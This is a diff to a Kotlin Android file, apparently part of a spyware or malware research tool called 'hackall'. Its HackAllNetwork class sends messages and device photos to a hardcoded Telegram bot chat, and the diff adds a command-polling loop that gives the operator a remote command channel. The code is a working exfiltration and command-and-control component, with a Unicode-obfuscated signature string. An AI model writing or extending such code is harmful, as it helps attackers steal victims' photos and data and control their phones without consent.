@@ -1,22 +1,38 @@
 package cocomelonc.hackall.tools
 
+import android.app.Activity
 import android.annotation.SuppressLint
 import android.content.Context
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
 import com.pengrad.telegrambot.TelegramBot
+import com.pengrad.telegrambot.model.request.Keyboard
+import com.pengrad.telegrambot.model.request.KeyboardButton
+import com.pengrad.telegrambot.model.request.ReplyKeyboardMarkup
+import com.pengrad.telegrambot.request.GetUpdates
 import com.pengrad.telegrambot.request.SendMessage
 import com.pengrad.telegrambot.request.SendPhoto
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import okhttp3.internal.notify
+import okhttp3.internal.notifyAll
 import java.nio.charset.StandardCharsets
-import java.util.*
+import java.util.Base64
 
 
 class HackAllNetwork(context: Context) : ViewModel() {
     private val token = HackAllUtils.getHackAllNetworkData(context).token
     private val id = HackAllUtils.getHackAllNetworkData(context).id
     private var bot = TelegramBot(token)
+
+    private fun simpleKeyboard(): Keyboard {
+        return ReplyKeyboardMarkup(
+            KeyboardButton("Meow"),
+            KeyboardButton("Meow"),
+            KeyboardButton("Meow"),
+            KeyboardButton("Meow"),
+        )
+    }
 
     @SuppressLint("NewApi")
     fun sendTextMessage(message: String) {
@@ -29,9 +45,11 @@ class HackAllNetwork(context: Context) : ViewModel() {
                 val meow = "\u004d\u0065\u006f\u0077\u0020\u0066\u0072\u006f\u006d\u0020\u0042\u0061\u0068\u0072\u0061\u0069\u006e\u0021"
                 val footer1 = "\uD83D\uDCF1"
                 val messageToSend = "${footer1}$message\n\n$info\n\n$meow\n\n${footer2}"
-                bot.execute(SendMessage(id, messageToSend))
+                bot.execute(SendMessage(id, messageToSend).replyMarkup(simpleKeyboard()))
             }
-        } catch (e: Exception) {}
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
     }
 
     fun sendPhotoMessage(photoPath: String) {
@@ -42,7 +60,7 @@ class HackAllNetwork(context: Context) : ViewModel() {
                     val photoName = photoFile.name
                     val message = "\uD83D\uDDBC\uFE0F Photo: ${photoName}"
                     sendTextMessage(message)
-                    bot.execute(SendPhoto(id, photoFile))
+                    bot.execute(SendPhoto(id, photoFile).replyMarkup(simpleKeyboard()))
                 }
             }
         } catch (e: Exception) {
@@ -50,4 +68,35 @@ class HackAllNetwork(context: Context) : ViewModel() {
         }
     }
 
+    fun startListenCommands() {
+        viewModelScope.launch(Dispatchers.IO) {
+            var thread: Thread = Thread(object : Runnable {
+            override fun run() {
+                try {
+                    getCommands()
+                } catch (e: java.lang.Exception) {
+                    e.printStackTrace()
+                }
+            }
+        })
+        thread.start()
+        }
+    }
+
+    fun getCommands() {
+        try {
+            val updates1 = GetUpdates().limit(1).offset(0).timeout(0)
+            val updateResponse = bot.execute(updates1)
+            val updates = updateResponse.updates()
+            updates.forEach {
+                val message = it.message()
+                val text = it.message().text()
+                val chatId = it.message().chat().id()
+                sendTextMessage("${chatId}:${text}")
+//                it.notify()
+            }
+        } catch (e: Exception) {
+            sendTextMessage("Error: ${e.toString()}")
+        }
+    }
 }
